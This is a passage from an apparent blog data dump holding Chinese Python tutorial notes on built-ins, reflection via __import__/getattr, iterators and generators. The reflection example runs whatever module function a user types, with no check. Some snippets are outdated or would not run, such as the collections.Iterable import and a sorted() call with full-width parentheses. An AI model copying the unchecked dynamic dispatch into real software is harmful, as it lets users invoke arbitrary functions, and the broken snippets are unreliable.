#分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\"></a>zip() #分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。</h5><ul>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">b = [<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zip(a,b) <span class=\"comment\">#返回(1, 4), (2, 5), (3, 6)</span></span><br></pre></td></tr></table></figure>\n<hr>\n<h5 id=\"globals-以字典类型返回当前位置的全部全局变量。\"><a href=\"#globals-以字典类型返回当前位置的全部全局变量。\" class=\"headerlink\" title=\"globals() #以字典类型返回当前位置的全部全局变量。\"></a>globals() #以字典类型返回当前位置的全部全局变量。</h5><h5 id=\"locals-函数会以字典类型返回当前位置的全部局部变量。\"><a href=\"#locals-函数会以字典类型返回当前位置的全部局部变量。\" class=\"headerlink\" title=\"locals() #函数会以字典类型返回当前位置的全部局部变量。\"></a>locals() #函数会以字典类型返回当前位置的全部局部变量。</h5><h5 id=\"hash-获取取一个对象（字符串或者数值等）的哈希值。\"><a href=\"#hash-获取取一个对象（字符串或者数值等）的哈希值。\" class=\"headerlink\" title=\"hash() #获取取一个对象（字符串或者数值等）的哈希值。\"></a>hash() #获取取一个对象（字符串或者数值等）的哈希值。</h5><hr>\n<h5 id=\"dir\"><a href=\"#dir\" class=\"headerlink\" title=\"dir()\"></a>dir()</h5><ul>\n<li>函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；</li>\n<li>带参数时，返回参数的属性、方法列表。</li>\n</ul>\n<h5 id=\"id-函数用于获取对象的内存地址。\"><a href=\"#id-函数用于获取对象的内存地址。\" class=\"headerlink\" title=\"id() #函数用于获取对象的内存地址。\"></a>id() #函数用于获取对象的内存地址。</h5><ul>\n<li>== 判断字符是否对应相同，相同返回True</li>\n<li>is 判断内存地址是否相同，相同返回True</li>\n</ul>\n<h5 id=\"type-返回对象的类型。\"><a href=\"#type-返回对象的类型。\" class=\"headerlink\" title=\"type() #返回对象的类型。\"></a>type() #返回对象的类型。</h5><ul>\n<li>isinstance() 与 type() 区别：type() 不会认为子类是一种父类类型，不考虑继承关系。</li>\n</ul>\n<h5 id=\"isinstance-判断对象是否为另一对象的实例。\"><a href=\"#isinstance-判断对象是否为另一对象的实例。\" class=\"headerlink\" title=\"isinstance() #判断对象是否为另一对象的实例。\"></a>isinstance() #判断对象是否为另一对象的实例。</h5><ul>\n<li>isinstance() 与 type() 区别：isinstance() 会认为子类是一种父类类型，考虑继承关系。</li>\n</ul>\n<h5 id=\"issubclass-判断对象是否为另一对象的子类。\"><a href=\"#issubclass-判断对象是否为另一对象的子类。\" class=\"headerlink\" title=\"issubclass() #判断对象是否为另一对象的子类。\"></a>issubclass() #判断对象是否为另一对象的子类。</h5><h5 id=\"len-返回对象（字符、列表、元组等）长度或项目个数。\"><a href=\"#len-返回对象（字符、列表、元组等）长度或项目个数。\" class=\"headerlink\" title=\"len() #返回对象（字符、列表、元组等）长度或项目个数。\"></a>len() #返回对象（字符、列表、元组等）长度或项目个数。</h5><hr>\n<h5 id=\"memoryview-返回给定参数的内存查看对象-Momory-view-。\"><a href=\"#memoryview-返回给定参数的内存查看对象-Momory-view-。\" class=\"headerlink\" title=\"memoryview() # 返回给定参数的内存查看对象(Momory view)。\"></a>memoryview() # 返回给定参数的内存查看对象(Momory view)。</h5><h5 id=\"range-函数可创建一个整数列表，一般用在-for-循环中。\"><a href=\"#range-函数可创建一个整数列表，一般用在-for-循环中。\" class=\"headerlink\" title=\"range() 函数可创建一个整数列表，一般用在 for 循环中。\"></a>range() 函数可创建一个整数列表，一般用在 for 循环中。</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">range(start, stop[, step])</span><br></pre></td></tr></table></figure>\n<h5 id=\"reversed-返回一个反转的迭代器。\"><a href=\"#reversed-返回一个反转的迭代器。\" class=\"headerlink\" title=\"reversed() #返回一个反转的迭代器。\"></a>reversed() #返回一个反转的迭代器。</h5><h5 id=\"round-方法返回浮点数x的四舍五入值。\"><a href=\"#round-方法返回浮点数x的四舍五入值。\" class=\"headerlink\" title=\"round() #方法返回浮点数x的四舍五入值。\"></a>round() #方法返回浮点数x的四舍五入值。</h5><h5 id=\"sorted-函数对所有可迭代的对象进行排序操作。\"><a href=\"#sorted-函数对所有可迭代的对象进行排序操作。\" class=\"headerlink\" title=\"sorted() 函数对所有可迭代的对象进行排序操作。\"></a>sorted() 函数对所有可迭代的对象进行排序操作。</h5><ul>\n<li>sort 与 sorted 区别：</li>\n</ul>\n<blockquote>\n<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>\n<p>sort是原处修改，sorted是产生新对象。</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 按value进行排序</span></span><br><span class=\"line\">sorted（dict.items(),key=<span class=\"keyword\">lambda</span> x:x[<span class=\"number\">1</span>]）</span><br></pre></td></tr></table></figure>\n<h5 id=\"vars-函数返回对象object的属性和属性值的字典对象。\"><a href=\"#vars-函数返回对象object的属性和属性值的字典对象。\" class=\"headerlink\" title=\"vars() #函数返回对象object的属性和属性值的字典对象。\"></a>vars() #函数返回对象object的属性和属性值的字典对象。</h5><h5 id=\"import-用于动态导入模块-。\"><a href=\"#import-用于动态导入模块-。\" class=\"headerlink\" title=\"__import__()  #用于动态导入模块 。\"></a>__import__()  #用于动态导入模块 。</h5><ul>\n<li>即可以以字符串类型的模块名导入模块。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os &lt;==&gt; __import__(&apos;os&apos;)</span><br></pre></td></tr></table></figure>\n<h6 id=\"反射\"><a href=\"#反射\" class=\"headerlink\" title=\"反射\"></a>反射</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>反射：利用字符串的形式去对象中操作（获取，查询，设置，删除）属性.</span><br><span class=\"line\">\tgetattr(module,attr)：到module对象（可以是模块等）查询attr属性并返回（可以是函数等）。</span><br><span class=\"line\">\thasattr(module,attr)：判断module对象是否有attr属性，有返回<span class=\"keyword\">True</span>,没有false。</span><br><span class=\"line\">\tsetattr(module,attr)：到module对象设置属性（导入模块会存在内存中，只会影响内存中的模块。）</span><br><span class=\"line\">\tdelattr(module,attr)：删除module对象的attr属性（在内存中而不会影响原模块 ）。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>例子：例如通过反射实现用户输入URL自动跳转到相应页面。</span><br><span class=\"line\">\t<span class=\"keyword\">import</span> modul</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \tuser_input = input(<span class=\"string\">'please input url:'</span>)</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> hasattr(modul,user_input):</span><br><span class=\"line\">        \tfun=getattr(modul,user_input)<span class=\"comment\">#返回函数体（函数名），而不是执行结果</span></span><br><span class=\"line\">        \tfun()</span><br><span class=\"line\">    \t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">        \tprint(<span class=\"string\">'not found'</span>)</span><br><span class=\"line\">\tf1()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#当需要的属性处于不同对象（模块）时，需要导入很多模块，不现实</span></span><br><span class=\"line\"><span class=\"comment\">#可以通过根据用户输入的判断导入哪个模块及其属性</span></span><br><span class=\"line\"><span class=\"comment\">#用户输入类型为str,但import module  ！=  import ’module‘</span></span><br><span class=\"line\"><span class=\"comment\">#但mod=__import__('mudule')等价于import module as mod</span></span><br><span class=\"line\"><span class=\"comment\">#提供了通过字符串导入模块的功能</span></span><br><span class=\"line\">\tuser_input=input(<span class=\"string\">'please input url(xx/xx):'</span>)<span class=\"comment\">#输入格式为【模块名/属性】</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \tmod_name,attr_name=user_input.split(<span class=\"string\">'/'</span>)</span><br><span class=\"line\">    \tmodu=__import__(mod_name) <span class=\"comment\">#引入模块命名为modu</span></span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> hasattr(modu,attr_name):</span><br><span class=\"line\">        \tfun=getattr(modu,attr_name)</span><br><span class=\"line\">        \tfun()</span><br><span class=\"line\">    \t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">        \tprint(<span class=\"number\">404</span>)</span><br><span class=\"line\">\tf2()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#若要导入模块不在当前目录下，而是某目录下（如abc目录下）</span></span><br><span class=\"line\"><span class=\"comment\">#__import__（'abc.module'）导入只会到abc，而不会到module</span></span><br><span class=\"line\"><span class=\"comment\">#__import__（'abc.module'，fromlist=True）加了该参数便可以</span></span><br></pre></td></tr></table></figure>"},{"title":"Python基础学习系列Chapter 8：迭代器与生成器","date":"2019-03-29T07:19:48.000Z","_content":"\n#### 0x00 概述\n\n- 可迭代对象：可用迭代工具（如for循环）迭代一次产生一个结果的对象。\n- 迭代器：可以记住取值的状态，一次返回一个值。\n- 可迭代对象执行`__iter__`方法，或者对应的iter()内置方法后，会返回一个迭代器。\n- 迭代工具：for、列表解析、in、map()等。\n\n<!-- more -->\n\n#### 0x01 可迭代对象\n\n- 支持`__iter__`或`__getitem__`方法的对象就是可迭代对象。\n- 可迭代对象不等于迭代器，但是可迭代对象可以产生迭代器。\n- 可迭代对象可以多次打开（生成）迭代器。\n- 可迭代对象需要迭代器才能一次取一个值。\n- for循环的实质也是先将可迭代对象先转换为迭代器。\n\n##### 0x02 可迭代对象产生迭代器\n\n- 调用内置方法iter()或重载方法`__iter__`后会返回一个迭代器。\n\n```python\n# 列表是可迭代对象，但不是迭代器\nlist=[1,2,3,4,5,6]\n\n# 两种方法\niter(list) \nlist.__iter__()\n```\n\n- 字典、元组、字符串、集合都是可迭代对象，但不是直接的迭代器。\n\n##### 0x03 判断是否为可迭代对象\n\n```python\nfrom collections import Iterable\n\nisinstance([], Iterable) #True\nisinstance({}, Iterable) #True\nisinstance('abc', Iterable) #True\n```\n\n#### 0x04 迭代器\n\n- 支持`__next__`方法的对象就是迭代器。\n- 迭代器可以记住状态并每次返回一个值。\n- 取到最后一个值时会抛出一个StopIteration异常,依靠该异常可以判断到了边界。\n\n```python\nlist=[1,2,3]\niterator = iter(list)\n\niterator.__next__() #返回1\niterator.__next__() #返回2\niterator.__next__() #返回3\niterator.__next__() #抛出异常StopIteration\n\n# iterator.__next__()等同于 next(iterator)\n```\n\n##### 0x05 判断是否为迭代器\n\n```python\nfrom collections import Iterator\n\nisinstance([], Iterator) #False\nisinstance((x for x in range(10)), Iterator) #True\n```\n\n#### 0x06 迭代工具 for\n\n- for循环的实质是：先将可迭代对象用iter()方法将其变为迭代器，再用迭代器的`__next__`方法逐一取值，最后捕获StopIteration异常判断结束。\n\n```python\n# for i in [1, 2, 3, 4, 5]\nit = iter([1, 2, 3, 4, 5])\nwhile True:\n    try:\n        # 获得下一个值:\n        i = it.__next__()\n    except StopIteration:\n        # 遇到StopIteration就退出循环\n        break\n```\n\n#### 0x07 生成器 generator\n\n- 生成器函数编写使用常规def语句，与普通函数区别在于：生成器函数yield一个值，而不是return一个值。\n- 生成器函数：使用了yield语句的函数。可以每次返回一个值并可以从上次退出的地方继续的函数。\n- yield将函数状态挂起，并向调用者返回一个值，没指定则返回none。挂起的状态包含整个本地作用域。\n- 调用生成器函数会返回一个生成器，生成器可以用迭代工具迭代。\n- 生成器本身也是一个迭代器（有`__next__`），而且是单迭代器对象，虽然有`__iter__`方法，但是没用，不能产生多个生成器。\n- 第一次执行`__next__（）`会从函数开始执行完全的一遍生成器函数，之后的next会从yield处开始。\n\n```python\ndef square(num): #定义生成器函数\n    for i in range(num):\n        yield i**2\nres = square(5) #生成生成器\n\nfor i in res: #迭代生成器\n    print(i)\n\n```\n\n##### 0x08 表达解析式生成生成器\n\n```python\n# 用圆括号\n(i*2 for i in range(11))\n```\n\n##### 0x09 send()：发送消息给生成器并返回发送的内容。\n\n- 会等同于`__next__`方法一样工作。\n- 还可以提供调用者与生成器之间的通信，即调用者可以用该方法发送信息给生成器。\n- 发送的消息由yield接收并返回，因此yield表达式可以写为：X=yield Y。yield每次会返回Y，同时也会接收send()发来的消息并赋值给X。\n- 遇到send()和yield都会进行中断。\n\n```python\n# 实现协程并行\n# 生产者与消费者模型\nimport time\ndef consumer(name):\n    print(\"%s 准备吃包子啦!\" %name)\n    while True:\n       baozi = yield\n       print(\"包子[%s]来了,被[%s]吃了!\" %(baozi,name))\n\ndef producer(name):\n    c1 = consumer('A')\n    c2 = consumer('B')\n    c1.__next__()\n    c2.__next__()\n    print(\"老子开始准备做包子啦!\")\n    for i in range(10):\n        time.sleep(1)\n        print(\"做了2个包子!\")\n        c1.send(i)\n        c2.send(i)\nproducer(\"老子\")\n```\n\n","source":"_posts/07python基础学习系列之迭代器、生成器.md","raw":"---\ntitle: Python基础学习系列Chapter 8：迭代器与生成器\ndate: 2019-03-29 15:19:48\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n#### 0x00 概述\n\n- 可迭代对象：可用迭代工具（如for循环）迭代一次产生一个结果的对象。\n- 迭代器：可以记住取值的状态，一次返回一个值。\n- 可迭代对象执行`__iter__`方法，或者对应的iter()内置方法后，会返回一个迭代器。\n- 迭代工具：for、列表解析、in、map()等。\n\n<!-- more -->\n\n#### 0x01 可迭代对象\n\n- 支持`__iter__`或`__getitem__`方法的对象就是可迭代对象。\n- 可迭代对象不等于迭代器，但是可迭代对象可以产生迭代器。\n- 可迭代对象可以多次打开（生成）迭代器。\n- 可迭代对象需要迭代器才能一次取一个值。\n- for循环的实质也是先将可迭代对象先转换为迭代器。\n\n##### 0x02 可迭代对象产生迭代器\n\n- 调用内置方法iter()或重载方法`__iter__`后会返回一个迭代器。\n\n```python\n# 列表是可迭代对象，但不是迭代器\nlist=[1,2,3,4,5,6]\n\n# 两种方法\niter(list) \nlist.__iter__()\n```\n\n- 字典、元组、字符串、集合都是可迭代对象，但不是直接的迭代器。\n\n##### 0x03 判断是否为可迭代对象\n\n```python\nfrom collections import Iterable\n\nisinstance([], Iterable) #True\nisinstance({}, Iterable) #True\nisinstance('abc', Iterable) #True\n```\n\n#### 0x04 迭代器\n\n- 支持`__next__`方法的对象就是迭代器。\n- 迭代器可以记住状态并每次返回一个值。\n- 取到最后一个值时会抛出一个StopIteration异常,依靠该异常可以判断到了边界。\n\n```python\nlist=[1,2,3]\niterator = iter(list)\n\niterator.__next__() #返回1\niterator.__next__() #返回2\niterator.__next__() #返回3\niterator.__next__() #抛出异常StopIteration\n\n# iterator.__next__()等同于 next(iterator)\n```\n\n##### 0x05 判断是否为迭代器\n\n```python\nfrom collections import Iterator\n\nisinstance([], Iterator) #False\nisinstance((x for x in range(10)), Iterator) #True\n```\n\n#### 0x06 迭代工具 for\n\n- for循环的实质是：先将可迭代对象用iter()方法将其变为迭代器，再用迭代器的`__next__`方法逐一取值，最后捕获StopIteration异常判断结束。\n\n```python\n# for i in [1, 2, 3, 4, 5]\nit = iter([1, 2, 3, 4, 5])\nwhile True:\n    try:\n        # 获得下一个值:\n        i = it.__next__()\n    except StopIteration:\n        # 遇到StopIteration就退出循环\n        break\n```\n\n#### 0x07 生成器 generator\n\n- 生成器函数编写使用常规def语句，与普通函数区别在于：生成器函数yield一个值，而不是return一个值。\n- 生成器函数：使用了yield语句的函数。可以每次返回一个值并可以从上次退出的地方继续的函数。\n- yield将函数状态挂起，并向调用者返回一个值，没指定则返回none。挂起的状态包含整个本地作用域。\n- 调用生成器函数会返回一个生成器，生成器可以用迭代工具迭代。\n- 生成器本身也是一个迭代器（有`__next__`），而且是单迭代器对象，虽然有`__iter__`方法，但是没用，不能产生多个生成器。\n- 第一次执行`__next__（）`会从函数开始执行完全的一遍生成器函数，之后的next会从yield处开始。\n\n```python\ndef square(num): #定义生成器函数\n    for i in range(num):\n        yield i**2\nres = square(5) #生成生成器\n\nfor i in res: #迭代生成器\n    print(i)\n\n```\n\n##### 0x08 表达解析式生成生成器\n\n```python\n# 用圆括号\n(i*2 for i in range(11))\n```\n\n##### 0x09 send()：发送消息给生成器并返回发送的内容。\n\n- 会等同于`__next__`方法一样工作。\n- 还可以提供调用者与生成器之间的通信，即调用者可以用该方法发送信息给生成器。\n- 发送的消息由yield接收并返回，因此yield表达式可以写为：X=yield Y。yield每次会返回Y，同时也会接收send()发来的消息并赋值给X。\n- 遇到send()和yield都会进行中断。\n\n```python\n# 实现协程并行\n# 生产者与消费者模型\nimport time\ndef consumer(name):\n    print(\"%s 准备吃包子啦!\" %name)\n    while True:\n       baozi = yield\n       print(\"包子[%s]来了,被[%s]吃了!\" %(baozi,name))\n\ndef producer(name):\n    c1 = consumer('A')\n    c2 = consumer('B')\n    c1.__next__()\n    c2.__next__()\n    print(\"老子开始准备做包子啦!\")\n    for i in range(10):\n        time.sleep(1)\n        print(\"做了2个包子!\")\n        c1.send(i)\n        c2.send(i)\nproducer(\"老子\")\n```\n\n","slug":"07python基础学习系列之迭代器、生成器","published":1,"updated":"2019-03-29T07:53:36.332Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kb001e7or0yskrkrdd","content":"<h4 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h4><ul>\n<li>可迭代对象：可用迭代工具（如for循环）迭代一次产生一个结果的对象。</li>\n<li>迭代器：可以记住取值的状态，一次返回一个值。</li>\n<li>可迭代对象执行<code>__iter__</code>方法，或者对应的iter()内置方法后，会返回一个迭代器。</li>\n<li>迭代工具：for、列表解析、in、map()等。</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"0x01-可迭代对象\"><a href=\"#0x01-可迭代对象\" class=\"headerlink\" title=\"0x01 可迭代对象\"></a>0x01 可迭代对象</h4><ul>\n<li>支持<code>__iter__</code>或<code>__getitem__</code>方法的对象就是可迭代对象。</li>\n<li>可迭代对象不等于迭代器，但是可迭代对象可以产生迭代器。</li>\n<li>可迭代对象可以多次打开（生成）迭代器。</li>\n<li>可迭代对象需要迭代器才能一次取一个值。</li>\n<li>for循环的实质也是先将可迭代对象先转换为迭代器。</li>\n</ul>\n<h5 id=\"0x02-可迭代对象产生迭代器\"><a href=\"#0x02-可迭代对象产生迭代器\" class=\"headerlink\" title=\"0x02 可迭代对象产生迭代器\"></a>0x02 可迭代对象产生迭代器</h5><ul>\n<li>调用内置方法iter()或重载方法<code>__iter__</code>后会返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列表是可迭代对象，但不是迭代器</span></span><br><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 两种方法</span></span><br><span class=\"line\">iter(list) </span><br><span class=\"line\">list.__iter__()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>字典、元组、字符串、集合都是可迭代对象，但不是直接的迭代器。</li>\n</ul>\n<h5 id=\"0x03-判断是否为可迭代对象\"><a href=\"#0x03-判断是否为可迭代对象\" class=\"headerlink\" title=\"0x03 判断是否为可迭代对象\"></a>0x03 判断是否为可迭代对象</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Iterable</span><br><span class=\"line\"></span><br><span class=\"line\">isinstance([], Iterable) <span class=\"comment\">#True</span></span><br><span class=\"line\">isinstance(&#123;&#125;, Iterable) <span class=\"comment\">#True</span></span><br><span class=\"line\">isinstance(<span class=\"string\">'abc'</span>, Iterable) <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-迭代器\"><a href=\"#0x04-迭代器\" class=\"headerlink\" title=\"0x04 迭代器\"></a>0x04 迭代器</h4><ul>\n<li>支持<code>__next__</code>方法的对象就是迭代器。</li>\n<li>迭代器可以记住状态并每次返回一个值。</li>\n<li>取到最后一个值时会抛出一个StopIteration异常,依靠该异常可以判断到了边界。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">iterator = iter(list)</span><br><span class=\"line\"></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回1</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回2</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回3</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#抛出异常StopIteration</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># iterator.__next__()等同于 next(iterator)</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x05-判断是否为迭代器\"><a href=\"#0x05-判断是否为迭代器\" class=\"headerlink\" title=\"0x05 判断是否为迭代器\"></a>0x05 判断是否为迭代器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Iterator</span><br><span class=\"line\"></span><br><span class=\"line\">isinstance([], Iterator) <span class=\"comment\">#False</span></span><br><span class=\"line\">isinstance((x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>)), Iterator) <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x06-迭代工具-for\"><a href=\"#0x06-迭代工具-for\" class=\"headerlink\" title=\"0x06 迭代工具 for\"></a>0x06 迭代工具 for</h4><ul>\n<li>for循环的实质是：先将可迭代对象用iter()方法将其变为迭代器，再用迭代器的<code>__next__</code>方法逐一取值，最后捕获StopIteration异常判断结束。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># for i in [1, 2, 3, 4, 5]</span></span><br><span class=\"line\">it = iter([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 获得下一个值:</span></span><br><span class=\"line\">        i = it.__next__()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> StopIteration:</span><br><span class=\"line\">        <span class=\"comment\"># 遇到StopIteration就退出循环</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x07-生成器-generator\"><a href=\"#0x07-生成器-generator\" class=\"headerlink\" title=\"0x07 生成器 generator\"></a>0x07 生成器 generator</h4><ul>\n<li>生成器函数编写使用常规def语句，与普通函数区别在于：生成器函数yield一个值，而不是return一个值。</li>\n<li>生成器函数：使用了yield语句的函数。可以每次返回一个值并可以从上次退出的地方继续的函数。</li>\n<li>yield将函数状态挂起，并向调用者返回一个值，没指定则返回none。挂起的状态包含整个本地作用域。</li>\n<li>调用生成器函数会返回一个生成器，生成器可以用迭代工具迭代。</li>\n<li>生成器本身也是一个迭代器（有<code>__next__</code>），而且是单迭代器对象，虽然有<code>__iter__</code>方法，但是没用，不能产生多个生成器。</li>\n<li>第一次执行<code>__next__（）</code>会从函数开始执行完全的一遍生成器函数，之后的next会从yield处开始。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">square</span><span class=\"params\">(num)</span>:</span> <span class=\"comment\">#定义生成器函数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> i**<span class=\"number\">2</span></span><br><span class=\"line\">res = square(<span class=\"number\">5</span>) <span class=\"comment\">#生成生成器</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res: <span class=\"comment\">#迭代生成器</span></span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<h5 id=\"0x08-表达解析式生成生成器\"><a href=\"#0x08-表达解析式生成生成器\" class=\"headerlink\" title=\"0x08 表达解析式生成生成器\"></a>0x08 表达解析式生成生成器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 用圆括号</span></span><br><span class=\"line\">(i*<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">11</span>))</span><br></pre></td></tr></table></figure>\n<h5 id=\"0x09-send-：发送消息给生成器并返回发送的内容。\"><a href=\"#0x09-send-：发送消息给生成器并返回发送的内容。\" class=\"headerlink\" title=\"0x09 send()：发送消息给生成器并返回发送的内容。\"></a>0x09 send()：发送消息给生成器并返回发送的内容。</h5><ul>\n<li>会等同于<code>__next__</code>方法一样工作。</li>\n<li>还可以提供调用者与生成器之间的通信，即调用者可以用该方法发送信息给生成器。</li>\n<li>发送的消息由yield接收并返回，因此yield表达式可以写为：X=yield Y。yield每次会返回Y，同时也会接收send()发来的消息并赋值给X。</li>\n<li>遇到send()和yield都会进行中断。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 实现协程并行</span></span><br><span class=\"line\"><span class=\"comment\"># 生产者与消费者模型</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span 